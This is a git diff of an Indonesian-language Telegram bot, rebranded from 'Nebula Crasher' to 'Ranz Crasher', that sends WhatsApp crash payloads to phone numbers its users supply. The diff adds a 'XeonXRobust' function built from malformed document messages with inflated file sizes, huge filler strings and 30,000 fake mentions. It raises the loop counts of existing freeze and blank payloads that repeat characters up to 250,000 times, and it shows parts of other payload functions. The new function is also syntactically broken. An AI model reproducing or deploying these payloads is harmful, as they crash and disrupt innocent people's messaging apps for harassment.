@@ -222,6 +222,20 @@ const isOwner = (userId) => {
   }
 };
 
+const groupOnlyAccess = allowedGroupIds => {
+  return (ctx, next) => {
+    if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
+      if (allowedGroupIds.includes(ctx.chat.id)) {
+        return next();
+      } else {
+        return ctx.reply("🚫 Group Ini Lom Di Kasi Acces Ama Owner");
+      }
+    } else {
+      return ctx.reply("❌ Khusus Group!");
+    }
+  };
+};
+
 const OWNER_ID = (userId) => {
   if (allowedDevelopers.includes(userId.toString())) {
     ysudh = "✅";
@@ -1608,7 +1622,7 @@ bot.command("cd", async (ctx) => {
 });
 
 //
-bot.command("cursed", checkPremium, async (ctx) => {
+bot.command("comboranz", async (ctx) => {
   const userId = ctx.from.id;
 
   // Cek apakah pengguna dalam cooldown
@@ -1622,7 +1636,7 @@ bot.command("cursed", checkPremium, async (ctx) => {
   }
 
   // Atur cooldown 60 detik
-  const cooldownDuration = 60000;
+  const cooldownDuration = 72000;
   cooldownUsers.set(userId, Date.now() + cooldownDuration);
 
   setTimeout(() => {
@@ -1669,14 +1683,9 @@ bot.command("cursed", checkPremium, async (ctx) => {
           continue;
         }
 
-        for (let i = 0; i < 5; i++) {
-          await Bug2(sock, target);
-          await nebula(sock, target);
-          await noclick(sock, target);
+        for (let i = 0; i < 10; i++) {
+          await XeonXRobust(sock, target);
           await InvisiPayload(sock, target);
-          await Payload(sock, target);
-          await noclick(sock, target);
-          await nebula(sock, target);
         }
         successCount++;
       } catch (error) {
@@ -1798,7 +1807,7 @@ bot.command("trashui", checkPremium, async (ctx) => {
     );
   }
 });
-bot.command("vortex", checkPremium, async (ctx) => {
+bot.command("bugranz", checkPremium, async (ctx) => {
   const userId = ctx.from.id;
 
   // Cek apakah pengguna dalam cooldown
@@ -1812,7 +1821,7 @@ bot.command("vortex", checkPremium, async (ctx) => {
   }
 
   // Atur cooldown 60 detik
-  const cooldownDuration = 60000;
+  const cooldownDuration = 90000;
   cooldownUsers.set(userId, Date.now() + cooldownDuration);
 
   setTimeout(() => {
@@ -1838,7 +1847,7 @@ bot.command("vortex", checkPremium, async (ctx) => {
 
     const statusMessage = await ctx.reply(
       `┏━━━━━━━━━━━━━━━━━━━━━
-┃        NEBULA CRASHER
+┃        RANZ CRASHER
 ┣━━━━━━━━━━━━━━━━━━━━━
 ┃ TARGET : ${formattedNumber}
 ┃ TYPE : VORTEX
@@ -1859,14 +1868,8 @@ bot.command("vortex", checkPremium, async (ctx) => {
           continue;
         }
 
-        for (let i = 0; i < 5; i++) {
-          await nebula(sock, target);
-          await noclick(sock, target);
-          await Payload(sock, target);
-          await InvisiPayload(sock, target);
-          await nebula(sock, target);
-          await nebula(sock, target);
-          await nebula(sock, target);
+        for (let i = 0; i < 30; i++) {
+          await XeonXRobust(sock, target);         
         }
         successCount++;
       } catch (error) {
@@ -1880,7 +1883,7 @@ bot.command("vortex", checkPremium, async (ctx) => {
       null,
       `  
 ┏━━━━━━━━━━━━━━━━━━━━━
-┃       NEBULA CRASHER
+┃       RANZ CRASHER
 ┣━━━━━━━━━━━━━━━━━━━━━
 ┃ TARGET : ${formattedNumber}
 ┃ TYPE : VORTEX
@@ -1896,7 +1899,42 @@ bot.command("vortex", checkPremium, async (ctx) => {
     );
   }
 });
-bot.command("invios", checkPremium, async (ctx) => {
+bot.command('grouponly', (ctx) => {
+  const userId = ctx.from.id.toString();
+
+  if (userId !== OWNER_ID && !isAdmin(userId)) {
+    return ctx.reply('❌ You are not authorized to use this command.');
+  }
+
+  botForGroup = true;
+  botForPrivateChat = false;
+  ctx.reply(`
+╭──(  ✅ Success    ) 
+│ Bot diatur untuk hanya merespon di Grup!
+╰━━━ㅡ━━━━━ㅡ━━━━━━⬣`);
+});
+const checkChatType = (ctx, next) => {
+  if (botForGroup && ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
+    ctx.reply('❌ Command ini hanya dapat digunakan di grup.');
+    return;
+  }
+
+  if (botForPrivateChat && ctx.chat.type !== 'private') {
+    ctx.reply('❌ Command ini hanya dapat digunakan di private chat.');
+    return;
+  }
+
+  next(); // Melanjutkan ke handler berikutnya jika lolos pengecekan
+};
+bot.use((ctx, next) => {
+  // Set variabel global untuk menentukan tipe bot
+  botForGroup = true; // Hanya untuk grup
+  botForPrivateChat = false; // Tidak untuk private chat
+
+  // Gunakan middleware
+  checkChatType(ctx, next);
+});
+bot.command("ranzv1", async (ctx) => {
   const userId = ctx.from.id;
 
   // Cek apakah pengguna dalam cooldown
@@ -1910,7 +1948,7 @@ bot.command("invios", checkPremium, async (ctx) => {
   }
 
   // Atur cooldown 60 detik
-  const cooldownDuration = 20000;
+  const cooldownDuration = 72000;
   cooldownUsers.set(userId, Date.now() + cooldownDuration);
 
   setTimeout(() => {
@@ -1936,7 +1974,7 @@ bot.command("invios", checkPremium, async (ctx) => {
 
     const statusMessage = await ctx.reply(
       `┏━━━━━━━━━━━━━━━━━━━━━
-┃        NEBULA CRASHER
+┃        RANZ CRASHER
 ┣━━━━━━━━━━━━━━━━━━━━━
 ┃ TARGET : ${formattedNumber}
 ┃ TYPE : INVIOS
@@ -1957,8 +1995,8 @@ bot.command("invios", checkPremium, async (ctx) => {
           continue;
         }
 
-        for (let i = 0; i < 15; i++) {
-          await BugIos(sock, target);
+        for (let i = 0; i < 30; i++) {
+          await InvisiPayload(sock, target);
         }
         successCount++;
       } catch (error) {
@@ -1972,7 +2010,7 @@ bot.command("invios", checkPremium, async (ctx) => {
       null,
       `  
 ┏━━━━━━━━━━━━━━━━━━━━━
-┃       NEBULA CRASHER
+┃       RANZ CRASHER
 ┣━━━━━━━━━━━━━━━━━━━━━
 ┃ TARGET : ${formattedNumber}
 ┃ TYPE : INVIOS
@@ -2010,8 +2048,8 @@ async function sendMainMenu(ctx) {
   ]);
   await ctx.replyWithPhoto(getRandomPhoto(), {
     caption: `
-╭───── ⧼ 𝑵 𝑬 𝑩 𝑼 𝑳 𝑨 ⧽
-│ ᴄʀᴇᴀᴛᴏʀ : ᴅᴇʟᴀᴘʟᴀᴄᴇ 
+╭───── ⧼ RanZbugtelebot ⧽
+│ ᴄʀᴇᴀᴛᴏʀ : Ranz
 │ ᴠᴇʀsɪ : ʙᴇᴛᴀ
 │ ᴏs : ʟɪɴᴜx
 │ ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ 
@@ -2021,10 +2059,8 @@ async function sendMainMenu(ctx) {
 │ ᴘʀᴇᴍɪᴜᴍ : ${isPremium ? "✅" : "❌"}
 ╰─────
 ╭───── ⧼ 𝑩 𝑼 𝑮 𝑴 𝑬 𝑵 𝑼 ⧽
-│ /ᴄᴜʀsᴇᴅ
-│ /ᴛʀᴀsʜᴜɪ
-│ /ᴠᴏʀᴛᴇx
-│ /ɪɴᴠɪᴏs
+│ /bugranz
+│ /ranzv1
 ╰─────
     `,
     parse_mode: "Markdown",
@@ -2066,8 +2102,8 @@ bot.action("startmenu", async (ctx) => {
     ],
   ]);
   const caption = `
-╭───── ⧼ 𝑵 𝑬 𝑩 𝑼 𝑳 𝑨 ⧽
-│ᴄʀᴇᴀᴛᴏʀ : ᴅᴇʟᴀᴘʟᴀᴄᴇ 
+╭───── ⧼ RanZbugtelebot ⧽
+│ᴄʀᴇᴀᴛᴏʀ : Ranz
 │ᴠᴇʀsɪ : ʙᴇᴛᴀ
 │ᴏs : ʟɪɴᴜx
 │ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ 
@@ -2077,10 +2113,8 @@ bot.action("startmenu", async (ctx) => {
 │ ᴘʀᴇᴍɪᴜᴍ : ${isPremium ? "✅" : "❌"}
 ╰─────
 ╭───── ⧼ 𝑩 𝑼 𝑮 𝑴 𝑬 𝑵 𝑼 ⧽
-│ /ᴄᴜʀsᴇᴅ
-│ /ᴛʀᴀsʜᴜɪ
-│ /ᴠᴏʀᴛᴇx
-│ /ɪɴᴠɪᴏs
+│ /bugranz
+│ /ranzv1
 ╰─────
 `;
 
@@ -2093,8 +2127,8 @@ bot.action("option2", async (ctx) => {
     [Markup.button.callback("𝑩𝑨𝑪𝑲", "startmenu")],
   ]);
   const caption = `
-╭───── ⧼ 𝑵 𝑬 𝑩 𝑼 𝑳 𝑨 ⧽
-│ᴄʀᴇᴀᴛᴏʀ : ᴅᴇʟᴀᴘʟᴀᴄᴇ 
+╭───── ⧼ RanZbugtelebot ⧽
+│ᴄʀᴇᴀᴛᴏʀ : Ranz
 │ᴠᴇʀsɪ : ʙᴇᴛᴀ
 │ᴏs : ʟɪɴᴜx
 │ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ 
@@ -2125,8 +2159,8 @@ bot.action("option1", async (ctx) => {
     [Markup.button.callback("𝑩𝑨𝑪𝑲", "startmenu")],
   ]);
   const caption = `
-╭───── ⧼ 𝑵 𝑬 𝑩 𝑼 𝑳 𝑨 ⧽
-│ᴄʀᴇᴀᴛᴏʀ : ᴅᴇʟᴀᴘʟᴀᴄᴇ 
+╭───── ⧼ RanZbugtelebot ⧽
+│ᴄʀᴇᴀᴛᴏʀ : Ranz
 │ᴠᴇʀsɪ : ʙᴇᴛᴀ
 │ᴏs : ʟɪɴᴜx
 │ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ 
@@ -2149,6 +2183,79 @@ bot.action("option1", async (ctx) => {
 
 //===============FUNC BUG==================\\
 // [ BUG FUNCTION ]
+async function XeonXRobust(target, Ptcp = true) {
+  const jids = _*~@0~*_\n.repeat(10200);
+  const ui = "ㅤ".repeat(10000);
+  await sock.relayMessage(target, {
+    ephemeralMessage: {
+      message: {
+        interactiveMessage: {
+          header: {
+            documentMessage: {
+              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+              fileLength: "9999999999999",
+              pageCount: 1316134911,
+              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+              fileName: "I Love You:)❤️",
+              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+              mediaKeyTimestamp: "1726867151",
+              contactVcard: true,
+              jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg"
+            },
+            hasMediaAttachment: true
+          },
+          body: {
+            text: "ㅤㅤㅤㅤㅤㅤ" + ui + jids
+          },
+          contextInfo: {
+            mentionedJid: ["0@s.whatsapp.net"],
+            mentions: ["0@s.whatsapp.net"]
+          },
+          footer: {
+            text: ""
+          },
+          nativeFlowMessage: {},
+          contextInfo: {
+            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
+              length: 30000
+            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
+            forwardingScore: 1,
+            isForwarded: true,
+            fromMe: false,
+            participant: "0@s.whatsapp.net",
+            remoteJid: "status@broadcast",
+            quotedMessage: {
+              documentMessage: {
+                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                fileLength: "9999999999999",
+                pageCount: 1316134911,
+                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+                fileName: "Yea? ThanksYou!",
+                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                mediaKeyTimestamp: "1724474503",
+                contactVcard: true,
+                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+                jpegThumbnail: ""
+              }
+            }
+          }
+        }
+      }
+    }
+  }, Ptcp ? {
+    participant: {
+      jid: target
+    }
+  } : {});
+}
 async function click(sock, target) {
   let msg = await generateWAMessageFromContent(
     sock,
@@ -2404,7 +2511,7 @@ async function InvisiPayload(sock, target) {
             },
           },
           body: {
-            text: "ꪶ𖣂ꫂ 𝗙𝗮𝗶𝗹 𝗕𝗲𝘁𝗮 - ( 𝙏𝙝𝙚 𝘿𝙚𝙨𝙩𝙧𝙤𝙮𝙚𝙧 )         𐎟",
+            text: "ㅤㅤㅤㅤㅤ",
           },
           nativeFlowMessage: {
             buttons: [
@@ -2887,7 +2994,7 @@ async function blank(sock, target) {
               hasMediaAttachment: true,
             },
             body: {
-              text: "𝐕𝐚𝐌𝐏𝐢𝐑𝐞 𝐇𝐞𝐑𝐞!!!" + ui + jids,
+              text: "ㅤ ㅤ" + ui + jids,
             },
             footer: {
               text: "",
@@ -2946,7 +3053,7 @@ async function blank(sock, target) {
 }
 
 async function freeze(sock, target) {
-  let virtex = "𝚅𝙰𝙼𝙿𝙸𝚁𝙴 𝙵𝚁𝙴𝙴𝚉𝙴" + "ꦾ".repeat(250000) + "@8".repeat(250000);
+  let virtex = "ㅤㅤㅤㅤ" + "ꦾ".repeat(250000) + "@8".repeat(250000);
   await sock.relayMessage(
     target,
     {
@@ -2997,7 +3104,7 @@ async function hard3(sock, target) {
         message: {
           newsletterAdminInviteMessage: {
             newsletterJid: `33333333333333333@newsletter`,
-            newsletterName: "𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝐁𝐋𝐀𝐍𝐊" + "ꦾ".repeat(120000),
+            newsletterName: "ㅤㅤㅤㅤ" + "ꦾ".repeat(120000),
             jpegThumbnail: "",
             caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
             inviteExpiration: Date.now() + 1814400000, // 21 hari
